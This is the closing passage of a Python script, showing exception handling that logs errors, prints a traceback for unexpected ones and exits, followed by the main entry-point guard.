
    except (ValueError, NotImplementedError, RuntimeError, argparse.ArgumentError, FileNotFoundError, ImportError) as e:
        log('-', f"Error: {e}")
        sys.exit(1)
    except Exception as e:
        log('-', f"An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

